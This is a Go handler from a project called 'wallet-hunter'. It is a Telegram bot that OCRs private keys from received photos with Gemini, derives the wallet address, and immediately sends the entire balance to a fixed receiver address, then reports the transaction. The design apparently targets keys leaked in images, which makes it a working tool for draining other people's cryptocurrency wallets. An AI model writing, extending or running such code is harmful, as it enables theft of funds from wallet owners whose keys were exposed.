package handler

import (
	"context"
	"fmt"
	"log/slog"
	"strings"
	"time"
	"wallet-hunter/config"
	"wallet-hunter/service"
	"wallet-hunter/util"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
)

type Hunter struct {
	cfg            *config.Config
	ETHClient      *service.ETH
	TelegramClient *service.Telegram
	GeminiClient   *service.Gemini
}

func NewHunter(cfg *config.Config, ethClient *service.ETH, telegramClient *service.Telegram, geminiClient *service.Gemini) *Hunter {
	return &Hunter{
		cfg:            cfg,
		ETHClient:      ethClient,
		TelegramClient: telegramClient,
		GeminiClient:   geminiClient,
	}
}

func (h *Hunter) Start(ctx context.Context) {
	updates := h.TelegramClient.Updates(60)

	for update := range updates {

		photo, isValid := h.TelegramClient.ListenImageMessage(update)
		if !isValid {
			continue
		}

		now := time.Now()

		imageByte, err := h.TelegramClient.FetchImage(photo)
		if err != nil {
			slog.Error("failed to fetch image", "error", err)
			_ = h.TelegramClient.SendHTML("Failed to fetch image\n" + err.Error())
			continue
		}

		key, err := h.GeminiClient.OCRImage(ctx, imageByte)
		if err != nil {
			slog.Error("failed to OCR image", "error", err)
			_ = h.TelegramClient.SendHTML("Failed to OCR image\n" + err.Error())
			continue
		}

		tx, err := h.processFund(ctx, key)
		if err != nil {
			slog.Error("failed to process fund", "error", err)
			_ = h.TelegramClient.SendHTML("Failed to process fund\n" + err.Error())
			continue
		}

		h.sendStatus(tx, time.Since(now))

	}
}

func (h *Hunter) sendStatus(tx service.TX, d time.Duration) {
	var reply string
	reply += fmt.Sprintf("Transaction hash: %s\n", util.Code(tx.Hash))
	reply += fmt.Sprintln("Sender: " + tx.Sender)
	reply += fmt.Sprintln("Receiver: " + tx.Receiver)
	reply += fmt.Sprintln(util.WeiBreakdown("Balance", tx.Total))
	reply += fmt.Sprintf("Gas Limit: %d\n", tx.GasLimit)
	reply += fmt.Sprintln(util.WeiBreakdown("Gas Price", tx.GasPrice))
	reply += fmt.Sprintln(util.WeiBreakdown("Gas", tx.Gas))
	reply += fmt.Sprintln(util.WeiBreakdown("Amount", tx.Amount))
	reply += fmt.Sprintf("\nDuration: %s\n", d)

	_ = h.TelegramClient.SendHTML(reply)
}

func (h *Hunter) processFund(ctx context.Context, key string) (service.TX, error) {
	key = strings.TrimSpace(key)
	key = strings.TrimPrefix(key, "0x")

	privKey, err := crypto.HexToECDSA(key)
	if err != nil {
		return service.TX{}, fmt.Errorf("failed to parse private key: %w", err)
	}

	sender := crypto.PubkeyToAddress(privKey.PublicKey)
	receiver := common.HexToAddress(h.cfg.ReceiverAddress)

	balance, err := h.ETHClient.GetBalance(ctx, sender)
	if err != nil {
		return service.TX{}, fmt.Errorf("failed to get balance: %w", err)
	}

	tx, err := h.ETHClient.SendToAddress(ctx, privKey, receiver, balance)
	if err != nil {
		return service.TX{}, fmt.Errorf("failed to send transaction: %w", err)
	}

	tx.Sender = sender.Hex()
	tx.Receiver = receiver.Hex()

	return tx, nil
}
